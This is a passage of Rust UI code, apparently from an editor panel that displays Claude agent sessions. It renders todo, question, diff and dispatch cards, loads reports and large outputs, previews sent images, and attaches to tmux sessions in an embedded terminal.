            );
        }
        let is_workflow_call = self
            .agent_calls
            .get(&key)
            .is_some_and(|call| call.is_workflow);
        let mut card_index = 0;
        for (phase, cards_of_phase) in group_cards_by_phase(cards, is_workflow_call) {
            if let Some(phase) = phase {
                element = element.child(
                    div().w_full().px_2().pb_0p5().child(
                        Label::new(phase_heading(&phase, &cards_of_phase))
                            .size(LabelSize::XSmall)
                            .color(Color::Muted),
                    ),
                );
            }
            for card in cards_of_phase {
                if card.offered {
                    element = element.child(self.render_agent_card(&key, card_index, card, cx));
                }
                card_index += 1;
            }
        }
        element.into_any_element()
    }

    fn render_todo_card(
        &mut self,
        index: usize,
        key: &SharedString,
        todos: Vec<TodoItem>,
        is_expanded: bool,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let summary = todo_summary(&todos);
        let header = self.render_disclosure_header(
            DisclosureHeader {
                entry_index: index,
                key,
                icon: IconName::Check,
                icon_color: Color::Accent,
                title: "Todos".into(),
                summary: Some(summary),
                is_expanded,
            },
            cx,
        );
        let mut column = v_flex().w_full().child(header);
        if is_expanded {
            for todo in todos {
                let (icon, color) = match todo.status {
                    TodoStatus::Pending => (IconName::Circle, Color::Muted),
                    TodoStatus::InProgress => (IconName::PlayOutlined, Color::Accent),
                    TodoStatus::Completed => (IconName::Check, Color::Success),
                };
                column = column.child(
                    h_flex()
                        .w_full()
                        .px_2()
                        .gap_1()
                        .child(Icon::new(icon).size(IconSize::XSmall).color(color))
                        .child(Label::new(todo.content).size(LabelSize::Small)),
                );
            }
        }
        column.into_any_element()
    }

    fn render_question_card(
        &mut self,
        index: usize,
        key: &SharedString,
        questions: Vec<AskedQuestion>,
        answers: Option<SharedString>,
        is_expanded: bool,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let summary = questions
            .first()
            .map(|question| question.question.clone())
            .unwrap_or_else(|| SharedString::from("Question"));
        let header = self.render_disclosure_header(
            DisclosureHeader {
                entry_index: index,
                key,
                icon: IconName::CircleHelp,
                icon_color: Color::Accent,
                title: "Question".into(),
                summary: Some(summary),
                is_expanded,
            },
            cx,
        );
        let mut column = v_flex().w_full().child(header);
        if is_expanded {
            for question in questions {
                if !question.header.is_empty() {
                    column = column.child(
                        div().w_full().px_2().child(
                            Label::new(question.header)
                                .size(LabelSize::XSmall)
                                .color(Color::Muted),
                        ),
                    );
                }
                if !question.question.is_empty() {
                    column = column.child(
                        div()
                            .w_full()
                            .px_2()
                            .child(Label::new(question.question).size(LabelSize::Small)),
                    );
                }
                for option in question.options {
                    column = column.child(
                        div().w_full().px_2().child(
                            Label::new(option)
                                .size(LabelSize::XSmall)
                                .color(Color::Muted),
                        ),
                    );
                }
            }
            if let Some(answers) = answers {
                column = column.child(
                    div().w_full().px_2().pt_1().child(
                        Label::new("Answer")
                            .size(LabelSize::XSmall)
                            .color(Color::Muted),
                    ),
                );
                column = column.child(
                    div()
                        .w_full()
                        .px_2()
                        .pb_1()
                        .child(Label::new(answers).size(LabelSize::Small)),
                );
            }
        }
        column.into_any_element()
    }

    fn render_diff_card(
        &mut self,
        index: usize,
        key: &SharedString,
        name: &SharedString,
        target: &SharedString,
        diff: &SharedString,
        is_expanded: bool,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let header = self.render_disclosure_header(
            DisclosureHeader {
                entry_index: index,
                key,
                icon: IconName::ToolHammer,
                icon_color: Color::Success,
                title: name.clone(),
                summary: Some(target.clone()),
                is_expanded,
            },
            cx,
        );
        let mut column = v_flex().w_full().child(header);
        if is_expanded {
            let mut body = v_flex().w_full().px_2().pb_1().font_buffer(cx).text_xs();
            for line in diff.lines() {
                let color = if line.starts_with('-') {
                    Color::Deleted
                } else if line.starts_with('+') {
                    Color::Created
                } else {
                    Color::Muted
                };
                body = body.child(Label::new(line.to_string()).color(color).buffer_font(cx));
            }
            column = column.child(body);
        }
        column.into_any_element()
    }

    fn render_dispatch_card(
        &mut self,
        index: usize,
        key: &SharedString,
        dispatch: CliDispatch,
        is_expanded: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let model = dispatch
            .model
            .clone()
            .unwrap_or_else(|| SharedString::from("dispatch"));
        let prompt_key = dispatch
            .prompt_path
            .as_ref()
            .map(|_| dispatch_prompt_key(key));
        if let Some(path) = dispatch.prompt_path.as_ref()
            && let Some(prompt_key) = prompt_key.as_ref()
        {
            self.load_dispatch_prompt(prompt_key.clone(), path.clone(), index, cx);
        }
        let first_line = prompt_key
            .as_ref()
            .and_then(|prompt_key| self.dispatch_prompts.get(prompt_key))
            .and_then(|load| match load {
                OutputLoad::Loaded(text) => text
                    .lines()
                    .find(|line| !line.trim().is_empty())
                    .map(|line| SharedString::from(line.trim().to_string())),
                _ => None,
            });
        let report = first_line
            .as_ref()
            .and_then(|text| report_path_in_prompt(text))
            .or_else(|| {
                prompt_key.as_ref().and_then(|prompt_key| {
                    self.dispatch_prompts
                        .get(prompt_key)
                        .and_then(|load| match load {
                            OutputLoad::Loaded(text) => report_path_in_prompt(text),
                            _ => None,
                        })
                })
            });

        let header = self.render_disclosure_header(
            DisclosureHeader {
                entry_index: index,
                key,
                icon: IconName::PlayOutlined,
                icon_color: Color::Accent,
                title: model,
                summary: first_line.clone(),
                is_expanded,
            },
            cx,
        );
        let mut column = v_flex().w_full().child(header);
        if is_expanded {
            if let Some(log_path) = dispatch.log_path.as_ref() {
                column = column.child(
                    div().w_full().px_2().child(
                        Label::new(format!("> {}", log_path.display()))
                            .size(LabelSize::XSmall)
                            .color(Color::Muted),
                    ),
                );
            }
            if let Some(first_line) = first_line {
                column = column.child(
                    div()
                        .w_full()
                        .px_2()
                        .child(Label::new(first_line).size(LabelSize::Small)),
                );
            }
            if let Some(report) = report {
                let report_key = dispatch_report_key(key);
                column = column.child(self.render_dispatch_report(
                    index,
                    &report_key,
                    &report,
                    window,
                    cx,
                ));
            }
        }
        column.into_any_element()
    }

    fn load_dispatch_prompt(
        &mut self,
        key: SharedString,
        path: PathBuf,
        entry_index: usize,
        cx: &mut Context<Self>,
    ) {
        if self.dispatch_prompts.contains_key(&key) {
            return;
        }
        self.dispatch_prompts
            .insert(key.clone(), OutputLoad::Loading);
        let read = self.source.read_file(path, MAX_DISPATCH_PROMPT_BYTES);
        let load = cx.spawn({
            let key = key.clone();
            async move |this, cx| {
                let result = read.await;
                this.update(cx, |this, cx| {
                    let load = match result {
                        Ok(contents) => OutputLoad::Loaded(persisted_output_text(contents).into()),
                        Err(error) => OutputLoad::Failed(format!("{error:#}").into()),
                    };
                    this.dispatch_prompts.insert(key, load);
                    this.list_state
                        .remeasure_items(entry_index..entry_index.saturating_add(1));
                    cx.notify();
                })
                .log_err();
            }
        });
        self.output_loads.insert(key, load);
    }

    fn render_dispatch_report(
        &mut self,
        entry_index: usize,
        key: &SharedString,
        path: &Path,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let basename = path
            .file_name()
            .map(|name| name.to_string_lossy().into_owned())
            .unwrap_or_else(|| path.to_string_lossy().into_owned());
        let load = self.loaded_outputs.get(key).cloned();
        let working_directory = self
            .selected_session(cx)
            .map(|session| session.working_directory);
        let can_load = working_directory
            .as_deref()
            .is_some_and(|directory| attachment_is_readable(path, directory));
        let load_key = key.clone();
        let load_path = path.to_path_buf();

        let action = match &load {
            Some(OutputLoad::Loaded(_)) => None,
            Some(OutputLoad::Failed(error)) => Some(
                Label::new(error.clone())
                    .size(LabelSize::XSmall)
                    .color(Color::Error)
                    .into_any_element(),
            ),
            Some(OutputLoad::Loading) => Some(
                Label::new("Loading…")
                    .size(LabelSize::XSmall)
                    .color(Color::Muted)
                    .into_any_element(),
            ),
            None if can_load => Some(
                Button::new(
                    SharedString::from(format!("load-report-{entry_index}")),
                    "Load",
                )
                .start_icon(Icon::new(IconName::CloudDownload).size(IconSize::XSmall))
                .label_size(LabelSize::XSmall)
                .on_click(cx.listener(move |this, _, _, cx| {
                    this.load_dispatch_report(load_key.clone(), load_path.clone(), entry_index, cx)
                }))
                .into_any_element(),
            ),
            None => None,
        };

        let body = match &load {
            Some(OutputLoad::Loaded(text)) => {
                let is_clamped = output_is_clamped(text, MAX_REPORT_UNCLAMPED_LINES);
                let output_key = output_expansion_key(key);
                let is_expanded = self.expanded.contains(&output_key);
                let shown = if is_clamped && !is_expanded {
                    SharedString::from(clamped_output(text, MAX_REPORT_UNCLAMPED_LINES).to_string())
                } else {
                    text.clone()
                };
                let markdown = self.markdown_for(key, shown, cx);
                let disclosure = is_clamped.then(|| {
                    let title = if is_expanded {
                        "Show less"
                    } else {
                        "Show the whole report"
                    };
                    self.render_disclosure_header(
                        DisclosureHeader {
                            entry_index,
                            key: &output_key,
                            icon: IconName::Ellipsis,
                            icon_color: Color::Muted,
                            title: title.into(),
                            summary: None,
                            is_expanded,
                        },
                        cx,
                    )
                });
                Some(
                    v_flex()
                        .w_full()
                        .gap_0p5()
                        .child(MarkdownElement::new(markdown, markdown_style(window, cx)))
                        .children(disclosure),
                )
            }
            _ => None,
        };

        v_flex()
            .w_full()
            .px_2()
            .pb_1()
            .gap_1()
            .child(
                Label::new(format!("Report · {basename}"))
                    .size(LabelSize::XSmall)
                    .color(Color::Muted)
                    .single_line(),
            )
            .children(action)
            .children(body)
            .into_any_element()
    }

    fn load_dispatch_report(
        &mut self,
        key: SharedString,
        path: PathBuf,
        entry_index: usize,
        cx: &mut Context<Self>,
    ) {
        let Some(session) = self.selected_session(cx) else {
            return;
        };
        if !attachment_is_readable(&path, &session.working_directory) {
            return;
        }
        if matches!(
            self.loaded_outputs.get(&key),
            Some(OutputLoad::Loading) | Some(OutputLoad::Loaded(_))
        ) {
            return;
        }

        self.loaded_outputs.insert(key.clone(), OutputLoad::Loading);
        let read =
            self.source
                .read_attachment(session.session_id, path, MAX_PERSISTED_OUTPUT_BYTES);
        let load = cx.spawn({
            let key = key.clone();
            async move |this, cx| {
                let result = read.await;
                this.update(cx, |this, cx| {
                    let load = match result {
                        Ok(contents) => OutputLoad::Loaded(persisted_output_text(contents).into()),
                        Err(error) => OutputLoad::Failed(format!("{error:#}").into()),
                    };
                    this.loaded_outputs.insert(key, load);
                    this.list_state
                        .remeasure_items(entry_index..entry_index.saturating_add(1));
                    cx.notify();
                })
                .log_err();
            }
        });
        self.output_loads.insert(key, load);
        cx.notify();
    }

    fn pending_background_agents(&self) -> Option<u64> {
        self.entries
            .iter()
            .rev()
            .find_map(|entry| match &entry.kind {
                EntryKind::TurnFooter {
                    pending_background_agents,
                    ..
                }
                | EntryKind::TurnSummary {
                    pending_background_agents,
                    ..
                } if *pending_background_agents > 0 => Some(*pending_background_agents),
                _ => None,
            })
    }

    fn ask_user_answers_after(&self, index: usize) -> Option<SharedString> {
        let next = self.entries.get(index.saturating_add(1))?;
        match &next.kind {
            EntryKind::ToolResult { label, body, .. }
                if label.as_ref() == ASK_USER_QUESTION_TOOL_NAME =>
            {
                ask_user_answer_text(body)
            }
            _ => None,
        }
    }

    fn render_persisted_output(
        &mut self,
        entry_index: usize,
        key: &SharedString,
        persisted: &PersistedOutput,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let load = self.loaded_outputs.get(key).cloned();
        let home_directory = self.store.read(cx).home_directory().map(Path::to_path_buf);
        let displayed_text = match &load {
            Some(OutputLoad::Loaded(text)) => text.clone(),
            _ => persisted.preview.clone(),
        };
        let path_label = SharedString::from(persisted.path.to_string_lossy().into_owned());
        let load_key = key.clone();
        let load_path = persisted.path.clone();

        let action = match &load {
            Some(OutputLoad::Loaded(_)) => None,
            Some(OutputLoad::Failed(error)) => Some(
                Label::new(error.clone())
                    .size(LabelSize::XSmall)
                    .color(Color::Error)
                    .into_any_element(),
            ),
            Some(OutputLoad::Loading) => Some(
                Label::new("Loading…")
                    .size(LabelSize::XSmall)
                    .color(Color::Muted)
                    .into_any_element(),
            ),
            None if persisted_output_is_loadable(&persisted.path, home_directory.as_deref()) => {
                Some(
                    Button::new(
                        SharedString::from(format!("load-output-{entry_index}")),
                        "Load full output",
                    )
                    .start_icon(Icon::new(IconName::CloudDownload).size(IconSize::XSmall))
                    .label_size(LabelSize::XSmall)
                    .on_click(cx.listener(move |this, _, _, cx| {
                        this.load_full_output(load_key.clone(), load_path.clone(), entry_index, cx)
                    }))
                    .into_any_element(),
                )
            }
            None => None,
        };
        let output = self.render_tool_output(entry_index, key, &displayed_text, window, cx);

        v_flex()
            .w_full()
            .px_2()
            .pb_1()
            .gap_1()
            .child(
                Label::new(format!("Output too large ({}); saved to", persisted.size))
                    .size(LabelSize::XSmall)
                    .color(Color::Muted),
            )
            .child(
                Label::new(path_label)
                    .size(LabelSize::XSmall)
                    .color(Color::Muted)
                    .single_line(),
            )
            .child(output)
            .children(action)
            .into_any_element()
    }

    /// One file a session sent: what it is, and — for an image small enough to fetch —
    /// the image itself.
    ///
    /// Anything that is not an image is named rather than drawn. There is no element that
    /// plays a video here, and a card that says which file arrived, how big it is and
    /// where it sits is what the reader can act on.
    fn render_sent_file(
        &mut self,
        entry_index: usize,
        key: &SharedString,
        file_index: usize,
        file: &SentFile,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let file_key = sent_file_key(key, file_index);
        let is_an_image_this_panel_draws = sent_image_format(file).is_some();
        let size = file.size;
        let over_soft_limit = size.is_some_and(|size| size > MAX_SENT_IMAGE_BYTES);
        let over_hard_limit = size.is_some_and(|size| size > MAX_SENT_IMAGE_BYTES_ABSOLUTE);
        let forced = self.forced_attachment_loads.contains(&file_key);
        let is_drawable =
            is_an_image_this_panel_draws && !over_hard_limit && (!over_soft_limit || forced);
        if is_drawable {
            self.load_sent_image(file_key.clone(), file, entry_index, cx);
        }

        let icon = if file.is_image {
            IconName::Image
        } else if file.is_video() {
            IconName::PlayOutlined
        } else {
            IconName::FileGeneric
        };
        let details: Vec<String> = file
            .size
            .map(describe_byte_count)
            .into_iter()
            .chain(file.media_type.as_ref().map(SharedString::to_string))
            .collect();

        let preview = match self.loaded_attachments.get(&file_key) {
            Some(AttachmentLoad::Loaded(image)) => {
                let zoom_key = file_key.clone();
                let zoom_image = image.clone();
                Some(
                    img(image.clone())
                        .id(SharedString::from(format!("claude-sent-image-{file_key}")))
                        .max_w_full()
                        .max_h(px(480.))
                        .cursor_pointer()
                        .on_click(cx.listener(move |this, _, _, cx| {
                            this.open_zoomed_image(zoom_key.clone(), zoom_image.clone(), cx);
                        }))
                        .into_any_element(),
                )
            }
            Some(AttachmentLoad::Loading) => Some(
                Label::new("Loading the image…")
                    .size(LabelSize::XSmall)
                    .color(Color::Muted)
                    .into_any_element(),
            ),
            Some(AttachmentLoad::Failed(error)) => Some(
                Label::new(format!("The image was not shown: {error}"))
                    .size(LabelSize::XSmall)
                    .color(Color::Error)
                    .into_any_element(),
            ),
            // An image that is not drawn says why it is not drawn: a card that shows a
            // file name where the reader expected a picture is the same silence as an
            // empty panel.
            None if is_an_image_this_panel_draws && over_hard_limit => Some(
                Label::new(format!(
                    "The image is larger than the {} this panel will fetch",
                    describe_byte_count(MAX_SENT_IMAGE_BYTES_ABSOLUTE)
                ))
                .size(LabelSize::XSmall)
                .color(Color::Muted)
                .into_any_element(),
            ),
            None if is_an_image_this_panel_draws && !is_drawable => {
                let size_label = size
                    .map(describe_byte_count)
                    .unwrap_or_else(|| describe_byte_count(MAX_SENT_IMAGE_BYTES));
                let force_key = file_key.clone();
                Some(
                    Button::new(
                        SharedString::from(format!("load-anyway-{force_key}")),
                        format!("Load anyway ({size_label})"),
                    )
                    .label_size(LabelSize::XSmall)
                    .on_click(cx.listener(move |this, _, _, cx| {
                        this.forced_attachment_loads.insert(force_key.clone());
                        this.loaded_attachments.remove(&force_key);
                        cx.notify();
                    }))
                    .into_any_element(),
                )
            }
            None => None,
        };

        let open_path = file.path.clone();
        let open_name = file.name.clone();
        let is_openable = !is_an_image_this_panel_draws || over_hard_limit;

        v_flex()
            .w_full()
            .gap_0p5()
            .child(
                h_flex()
                    .gap_1()
                    .child(Icon::new(icon).size(IconSize::XSmall).color(Color::Muted))
                    .child(Label::new(file.name.clone()).size(LabelSize::Small))
                    .when(!details.is_empty(), |row| {
                        row.child(
                            Label::new(details.join(" · "))
                                .size(LabelSize::XSmall)
                                .color(Color::Muted),
                        )
                    }),
            )
            .child(if is_openable {
                Button::new(
                    SharedString::from(format!("open-sent-{file_key}")),
                    SharedString::from(file.path.to_string_lossy().into_owned()),
                )
                .label_size(LabelSize::XSmall)
                .tooltip(Tooltip::text(format!("Open {open_name}")))
                .on_click(cx.listener(move |this, _, _, cx| {
                    this.open_sent_path(open_path.clone(), cx);
                }))
                .into_any_element()
            } else {
                Label::new(SharedString::from(file.path.to_string_lossy().into_owned()))
                    .size(LabelSize::XSmall)
                    .color(Color::Muted)
                    .single_line()
                    .into_any_element()
            })
            .children(preview)
            .into_any_element()
    }

    /// The framed card a tool's output is drawn in: clamped to its first lines, with a
    /// disclosure for the rest, when the output is long.
    fn render_tool_output(
        &mut self,
        entry_index: usize,
        key: &SharedString,
        text: &SharedString,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let card = div()
            .w_full()
            .rounded_sm()
            .border_1()
            .border_color(cx.theme().colors().border_variant)
            .bg(cx.theme().colors().editor_background);

        if text.trim().is_empty() {
            return card
                .px_1p5()
                .py_1()
                .child(
                    Label::new(NO_OUTPUT_NOTE)
                        .size(LabelSize::XSmall)
                        .color(Color::Muted),
                )
                .into_any_element();
        }

        let output_key = output_expansion_key(key);
        let is_expanded = self.expanded.contains(&output_key);
        let is_clamped = output_is_clamped(text, MAX_UNCLAMPED_OUTPUT_LINES);
        let shown = if is_clamped && !is_expanded {
            SharedString::from(clamped_output(text, MAX_UNCLAMPED_OUTPUT_LINES).to_string())
        } else {
            text.clone()
        };
        let markdown = self.markdown_for(key, fenced_code(&shown, ""), cx);
        let disclosure = is_clamped.then(|| {
            let title = if is_expanded {
                "Show less"
            } else {
                "Show the whole output"
            };
            self.render_disclosure_header(
                DisclosureHeader {
                    entry_index,
                    key: &output_key,
                    icon: IconName::Ellipsis,
                    icon_color: Color::Muted,
                    title: title.into(),
                    summary: None,
                    is_expanded,
                },
                cx,
            )
        });

        v_flex()
            .w_full()
            .gap_0p5()
            .child(card.child(MarkdownElement::new(
                markdown,
                tool_output_markdown_style(window, cx),
            )))
            .children(disclosure)
            .into_any_element()
    }

    fn render_disclosure_header(
        &self,
        header: DisclosureHeader<'_>,
        cx: &mut Context<Self>,
    ) -> ListItem {
        let DisclosureHeader {
            entry_index,
            key,
            icon,
            icon_color,
            title,
            summary,
            is_expanded,
        } = header;
        let toggle_key = key.clone();
        let click_key = key.clone();

        // Identified by the entry's key rather than by its position, so that the row a
        // reader is hovering keeps its state as the conversation grows above it, and so
        // that an output's own disclosure is not the same element as its entry's header.
        ListItem::new(SharedString::from(format!("entry-{key}")))
            .spacing(ListItemSpacing::Sparse)
            .toggle(is_expanded)
            .on_toggle(cx.listener(move |this, _, _, cx| {
                this.toggle_expanded(toggle_key.clone(), entry_index, cx)
            }))
            .start_slot(Icon::new(icon).size(IconSize::XSmall).color(icon_color))
            .child(
                h_flex()
                    .gap_1()
                    .overflow_hidden()
                    .child(Label::new(title).size(LabelSize::Small).single_line())
                    .children(summary.map(|summary| {
                        Label::new(summary)
                            .size(LabelSize::XSmall)
                            .color(Color::Muted)
                            .single_line()
                    })),
            )
            .on_click(cx.listener(move |this, _, _, cx| {
                this.toggle_expanded(click_key.clone(), entry_index, cx)
            }))
    }

    fn terminal_focus_handle(&self, cx: &App) -> FocusHandle {
        if let Some(terminal) = &self.terminal {
            terminal.focus_handle(cx)
        } else {
            self.focus_handle.clone()
        }
    }

    fn sync_terminal(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let wanted = {
            let store = self.store.read(cx);
            let transcript_is_main = matches!(store.transcript_target(), TranscriptTarget::Main);
            let live_session = store.selected_session().map(|session| {
                (
                    session.session_id.clone(),
                    session.process_id,
                    session.tmux_target.clone(),
                )
            });
            wanted_terminal(
                self.in_pane,
                transcript_is_main,
                live_session
                    .as_ref()
                    .map(|(session_id, process_id, tmux_target)| {
                        (session_id.as_str(), *process_id, tmux_target.as_deref())
                    }),
            )
        };
        // `Keep` is the only path that does not read `attach_arguments`. A `/clear` lands
        // here: the conversation id changed and the pane did not, so the client stays.
        if terminal_sync(self.terminal_for.as_ref(), wanted.as_ref()) == TerminalSync::Keep {
            return;
        }

        self.terminal = None;
        self.terminal_for = wanted.clone();
        self._terminal_attach = Task::ready(());
        self.lifecycle_note = None;

        let Some(target) = wanted else {
            cx.notify();
            return;
        };
        let Some(arguments) = self.store.read(cx).attach_arguments() else {
            self.lifecycle_note = Some(SharedString::from(
                "This session is not running in a tmux pane. Attach from the sessions list.",
            ));
            cx.notify();
            return;
        };
        let Some(workspace) = self.workspace.upgrade() else {
            self.lifecycle_note = Some(SharedString::from("The workspace is not available."));
            cx.notify();
            return;
        };
        let project: Entity<Project> = workspace.read(cx).project().clone();
        // `command` is spawned as a program with `args`, never through a shell, so every
        // target reaches tmux as its own argument.
        let label = format!("tmux {}", arguments.join(" "));
        let spawn = SpawnInTerminal {
            id: TaskId(format!("claude-session-attach-{}", target.process_id)),
            full_label: label.clone(),
            label: label.clone(),
            command: Some("tmux".to_string()),
            args: arguments,
            command_label: label,
            use_new_terminal: true,
            allow_concurrent_runs: true,
            reveal: RevealStrategy::NoFocus,
            ..Default::default()
        };
        let terminal_task =
            project.update(cx, |project, cx| project.create_terminal_task(spawn, cx));
        let project = project.downgrade();
        self._terminal_attach = cx.spawn_in(window, async move |this, cx| {
            let terminal = match terminal_task.await {
                Ok(terminal) => terminal,
                Err(error) => {
                    this.update(cx, |this, cx| {
                        if this.terminal_for.as_ref() == Some(&target) {
                            this.lifecycle_note = Some(SharedString::from(format!(
                                "Attaching to the session: {error:#}"
                            )));
                            cx.notify();
                        }
                    })
                    .log_err();
                    return;
                }
            };
            this.update_in(cx, |this, window, cx| {
                if this.terminal_for.as_ref() != Some(&target) {
                    return;
                }
                let workspace = this.workspace.clone();
                let project = project.clone();
                this.terminal = Some(cx.new(|cx| {
                    let mut terminal_view =
                        TerminalView::new(terminal, workspace, None, project, window, cx);
                    // Not embedded mode: it sizes the element to the lines the terminal has
                    // used, which resizes the pty to that height. tmux then sizes the shared
                    // window to this client, so a freshly attached pane locks itself to the
                    // one row it started with. The pane has to fill the area it is given.
                    terminal_view.set_show_workspace_actions(false, cx);
                    terminal_view
                }));
                this.lifecycle_note = None;
                cx.notify();
            })
            .log_err();
        });
        cx.notify();
    }

    fn terminal_placeholder(&self, cx: &App) -> SharedString {
        if self.terminal_for.is_some() {
            if let Some(note) = &self.lifecycle_note {
                return note.clone();
            }
            return SharedString::from("Attaching…");
        }
        let store = self.store.read(cx);
        if store.selected_is_ended() {
            return SharedString::from("This session has ended.");
        }
        if store.selected_session().is_some() {
            return SharedString::from(
                "This session is not running in a tmux pane. Attach from the sessions list.",
            );
        }
        SharedString::from(SELECT_A_SESSION)
    }

    fn render_terminal_area(&self, cx: &mut Context<Self>) -> AnyElement {
        let body = if let Some(terminal) = self.terminal.clone() {
            div().size_full().child(terminal)
        } else {
            div().size_full().p_2().child(
                Label::new(self.terminal_placeholder(cx))
                    .size(LabelSize::Small)
                    .color(Color::Muted),
            )
        };
        div()
            .flex_grow_1()
            .min_w_0()
            .min_h_0()
            .h_full()
            .child(body)
            .into_any_element()
    }

    fn render_turn_cost(
        &mut self,
        index: usize,
        attach: bool,
        cx: &mut Context<Self>,
    ) -> Option<AnyElement> {
        if !attach {
            return None;
        }
        let (start, _) = turn_bounds(&self.entries, index)?;
        let (calls, total) = displayed_turn_usage(&self.entries, index, &self.turn_bills)?;
        if calls.is_empty() {
            return None;
        }
        let model = self.store.read(cx).transcript().spend().model;
        let rates = rates_for_model(model.as_deref()?)?;
        let turn_id = self.entries.get(start)?.key.clone();
        let cost_key = turn_cost_key(&turn_id);
        let expanded = self.expanded.contains(&cost_key);
        let usages = if expanded { calls } else { vec![total] };
        let lines: Vec<SharedString> = usages
            .into_iter()
            .map(|usage| SharedString::from(answer_summary(usage, rates, None)))
            .collect();
        let toggle_key = cost_key;
        Some(
            v_flex()
                .id(SharedString::from(format!("turn-cost-{turn_id}")))
                .w_full()
                .px_2()
                .py_0p5()
                .gap_0p5()
                .cursor_pointer()
                .on_click(cx.listener(move |this, _, _, cx| {
                    this.toggle_expanded(toggle_key.clone(), index, cx);
                }))
                .children(lines.into_iter().map(|line| {
                    Label::new(line)
                        .size(LabelSize::XSmall)
                        .color(Color::Hidden)
                }))
                .into_any_element(),
        )
    }

    fn anchor_glyphs(cx: &App) -> Glyphs {
        let settings = ClaudeSessionsSettings::get_global(cx);
        Glyphs {
            user_prompt: settings.user_prompt_glyph,
            assistant: settings.assistant_glyph,
        }
    }

    fn cached_anchorings(
        &mut self,
        rows: &[ScreenRow],
        glyphs: Glyphs,
        columns: usize,
        screen_lines: usize,
        line_height: Pixels,
        cell_width: Pixels,
        scrolled_back: bool,
    ) -> Vec<Anchoring> {
        // `grid_lines_change` stays Unchanged when a cell is rewritten in place, so
        // the cache key is the visible rows. A frame whose rows, entries, glyphs,
        // and terminal size match the last one does not run the subsequence again.
        // The same rows at the bottom and in the scrollback use different windows.
        if let Some(cache) = &self.anchor_cache
            && cache.entries_generation == self.entries_generation
            && cache.glyphs == glyphs
            && cache.columns == columns
            && cache.screen_lines == screen_lines
            && cache.line_height == line_height
            && cache.cell_width == cell_width
            && self.cached_scrolled_back == scrolled_back
            && cache.rows == rows
        {
            return cache.anchorings.clone();
        }

        let transcript = reusable_anchors(self.anchor_cache.take(), self.entries_generation)
            .unwrap_or_else(|| {
                self.reachable_anchors
                    .iter()
                    .map(|anchor| anchor.anchor.clone())
                    .collect()
            });
        let anchors = terminal_anchors::anchor_rows(rows, &glyphs);
        let window = transcript_window_for_screen(&anchors, &transcript, scrolled_back);
        let anchorings = terminal_anchors::align(&anchors, window);
        self.cached_scrolled_back = scrolled_back;
        self.anchor_cache = Some(AnchorCache {
            entries_generation: self.entries_generation,
            glyphs,
            columns,
            screen_lines,
            line_height,
            cell_width,
            rows: rows.to_vec(),
            transcript,
            anchorings: anchorings.clone(),
        });
        anchorings
    }

    fn render_anchor_gutter(&mut self, cx: &mut Context<Self>) -> AnyElement {
        let Some(terminal) = self.terminal.clone() else {
            self.anchored_on_screen.clear();
            self.followed_index = None;
            return div().into_any_element();
        };
        let (cells, screen_lines, columns, line_height, cell_width, scrolled_back) = terminal
            .read_with(cx, |terminal_view, cx| {
                let terminal = terminal_view.terminal().clone();
                terminal.read_with(cx, |terminal, _| {
                    let content = terminal.last_content();
                    let display_offset = content.display_offset;
                    let cells = content
                        .cells
                        .iter()
                        .filter(|cell| !cell.is_wide_char_spacer())
                        .map(|cell| {
                            (
                                visible_grid_line(cell.point.line, display_offset),
                                cell.point.column,
                                cell.character(),
                            )
                        })
                        .collect::<Vec<_>>();
                    (
                        cells,
                        content.screen_lines,
                        content.columns,
                        content.terminal_bounds.line_height,
                        content.terminal_bounds.cell_width,
                        display_offset > 0,
                    )
                })
            });
        let glyphs = Self::anchor_glyphs(cx);
        let rows = terminal_anchors::screen_rows(cells.into_iter(), screen_lines);
        let anchorings = self.cached_anchorings(
            &rows,
            glyphs,
            columns,
            screen_lines,
            line_height,
            cell_width,
            scrolled_back,
        );
        self.anchored_on_screen = anchored_on_screen_keys(&anchorings);
        let follow = rail_follow_index(
            &anchorings,
            &self.reachable_anchors,
            scrolled_back,
            self.entries.len(),
        );
        if let Some(index) = rail_follow_scroll(self.followed_index, follow, scrolled_back) {
            self.list_state.scroll_to_reveal_item(index);
            self.followed_index = Some(index);
        } else if !scrolled_back || follow.is_none() {
            self.followed_index = None;
        }
        let chips = anchorings
            .into_iter()
            .filter_map(|anchoring| {
                let stored = self
                    .reachable_anchors
                    .iter()
                    .find(|anchor| anchor.anchor.key == anchoring.key)?;
                let chip = stored.chip?;
                if self.entries.get(stored.index).is_none() {
                    return None;
                }
                Some((anchoring.row, anchoring.key, anchor_chip_icon(chip)))
            })
            .collect::<Vec<_>>();
        let panel_id = cx.entity_id();

        div()
            .id(SharedString::from(format!(
                "claude-anchor-gutter-{panel_id:?}"
            )))
            .w(px(ANCHOR_GUTTER_WIDTH_PIXELS))
            .h_full()
            .flex_none()
            .relative()
            .overflow_hidden()
            .children(chips.into_iter().map(|(row, key, icon)| {
                let key = SharedString::from(key);
                let emphasized = self.hovered_anchor.as_ref() == Some(&key);
                let hover_key = key.clone();
                div()
                    .id(SharedString::from(format!(
                        "claude-anchor-chip-{panel_id:?}-{row}"
                    )))
                    .absolute()
                    .top(anchor_chip_top(row, line_height))
                    .left_0()
                    .w_full()
                    .h(line_height)
                    .flex()
                    .items_center()
                    .justify_center()
                    .cursor_pointer()
                    .on_hover(cx.listener(move |this, hovered, _, cx| {
                        let next = if *hovered {
                            Some(hover_key.clone())
                        } else {
                            None
                        };
                        this.set_hovered_anchor(next, cx);
                    }))
                    .on_click(cx.listener(move |this, _, _, cx| {
                        this.reveal_anchored_entry(key.clone(), cx);
                    }))
                    .child(
                        Icon::new(icon)
                            .size(if emphasized {
                                IconSize::Small
                            } else {
                                IconSize::XSmall
                            })
                            .color(if emphasized {
                                Color::Accent
                            } else {
                                Color::Muted
                            }),
                    )
            }))
            .into_any_element()
    }

    fn render_terminal_and_rail(
        &mut self,
        reading_an_agent: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let area = work_area(self.rail_expanded, reading_an_agent);
        let gutter_shown = anchor_gutter_shown(area, self.terminal.is_some());
        if !gutter_shown {
            self.anchored_on_screen.clear();
            self.followed_index = None;
        }
